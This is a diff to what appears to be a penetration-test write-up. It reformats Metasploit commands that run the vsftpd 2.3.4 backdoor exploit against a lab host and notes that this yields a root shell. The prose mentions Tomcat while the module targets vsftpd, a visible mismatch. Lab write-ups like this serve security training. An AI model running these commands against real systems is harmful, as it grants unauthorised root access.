@@ -198,9 +198,11 @@ We launched Metasploit and searched for exploits related to this version of Tomc
 
 We properly configured the exploit:
 ```python
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.16.25.2
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.16.25.2
+
+> msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ```
 
 This exploit run a Backdoor Command Execution and provides us with a root shell
